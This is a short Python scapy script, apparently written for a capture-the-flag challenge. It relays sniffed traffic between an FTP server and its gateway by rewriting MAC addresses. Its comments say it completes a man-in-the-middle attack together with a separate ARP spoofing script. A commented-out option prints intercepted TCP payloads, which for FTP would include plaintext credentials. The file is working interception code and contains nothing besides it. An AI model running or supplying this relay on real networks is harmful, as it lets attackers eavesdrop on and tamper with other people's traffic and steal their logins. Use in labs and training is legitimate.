# Developer: Netanel-Arkash
# Date: 23/7/24

# purpose: This script was used in a CTF challenge to forward traffic between ftp server and client.
# There is a need to run the ARP_spoofing.py first and both scripts together complete the MITM attack.
from scapy.all import *
from os import system

gateway = '192.168.2.254'
anonymous = '192.168.3.1'
server = '192.168.2.8'
attacker = '192.168.2.2'
# ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=server), timeout=3, verbose=0)
# ans1, unans1 = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gateway), timeout=3, verbose=0)
attacker_mac = '02:42:c0:a8:02:02'
server_mac = '02:42:c0:a8:02:08'
gateway_mac = '02:42:a6:8a:b7:bb'


def filter(pkt):
    if pkt.haslayer(IP):
        if pkt[IP].dst != attacker:
            if pkt[Ether].src == gateway_mac or pkt[Ether].src == server_mac:
                return True
    
    return False


def forward(capture):
    if capture.haslayer(TCP):
        
        # Delete checksums to force recalculation
        del capture[IP].chksum
        del capture[TCP].chksum
        
        if capture[Ether].src == gateway_mac:
            capture[Ether].dst = server_mac
        
        elif capture[Ether].src == server_mac:
            capture[Ether].dst = gateway_mac

        capture[Ether].src = attacker_mac
        capture = capture.__class__(bytes(capture)) # Checksum recalculation
        
        sendp(capture, verbose=0)
        
        # Optional
        # if capture[TCP].payload:
            # print(capture[TCP].payload.load.decode('utf-8', 'ignore'))

# system('python3 ARP_spoofing.py')

print('Sniffing has started!')

sniff(prn=forward, lfilter=filter, count = 0) # count=0 sniffs continuosly